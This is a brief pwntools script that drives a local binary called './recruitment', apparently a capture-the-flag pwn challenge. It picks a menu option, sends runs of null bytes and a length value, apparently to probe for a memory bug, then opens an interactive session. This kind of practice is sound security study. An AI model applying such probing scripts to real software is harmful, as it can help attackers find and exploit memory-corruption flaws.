from pwn import *

p = process('./recruitment')

print(p.recv(1024).decode())

p.sendline(b'1')
print(p.recv(1024).decode())

p.sendline(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
p.sendline(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
p.sendline(b'30')

print(p.recv(1024).decode())

p.interactive()
